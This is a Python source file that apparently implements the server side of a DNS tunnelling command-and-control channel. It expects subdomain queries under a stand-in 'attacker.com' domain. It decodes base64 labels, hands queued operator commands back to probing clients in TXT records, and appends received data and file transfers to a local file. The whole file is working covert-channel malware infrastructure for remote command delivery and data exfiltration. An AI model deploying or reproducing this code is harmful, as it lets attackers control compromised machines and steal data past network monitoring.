
import queue 
import base64
from dnslib.server import BaseResolver, QTYPE, RR 
from dnslib import TXT
from printer_message import PrinterMessage, PrinterMessageType
from enum import Enum

class TunnelMessageType(Enum): 
    PROBE = 1
    ACK = 2
    FILE_START = 3
    FILE_END = 4

class TunnelResolver(BaseResolver):
    def __init__(self, command_queue: queue.Queue, print_queue: queue.Queue, response_file_path: str): 
        self.command_queue = command_queue
        self.print_queue = print_queue
        self.response_file_path = response_file_path
        super().__init__()

    def resolve(self, request, handler):
        reply = request.reply()

        qname = request.q.qname
        labels = str(qname).rstrip(".").split(".")

        # Expect: <payload>.attacker.com
        try:
            payload = labels[0]

            decoded = base64.urlsafe_b64decode(payload + "==").decode()

            response_text = TunnelMessageType.ACK.name

            # Send command if one exists on PROBE message 
            match decoded: 
                case TunnelMessageType.PROBE.name: 
                    # self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.PROBE))
                    try: 
                        response_text = self.command_queue.get_nowait()
                        self.print_queue.put(PrinterMessage(message=response_text, message_type=PrinterMessageType.SENT))
                    except queue.Empty: 
                        pass
                case TunnelMessageType.FILE_START.name: 
                    self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.FILE_START))
                case TunnelMessageType.FILE_END.name: 
                    self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.FILE_END))
                case _: 
                    self.print_queue.put(PrinterMessage(message=decoded, message_type=PrinterMessageType.RECEIVED))
                    with open(self.response_file_path, "a") as f: 
                        f.write(decoded)

            encoded_resp = base64.urlsafe_b64encode(
                response_text.encode()
            ).decode()

            reply.add_answer(
                RR(
                    qname,
                    QTYPE.TXT,
                    rdata=TXT(encoded_resp),
                    ttl=0
                )
            )
        except Exception as e:
            self.print_queue.put(PrinterMessage(message=str(e), message_type=PrinterMessageType.ERROR))

        return reply



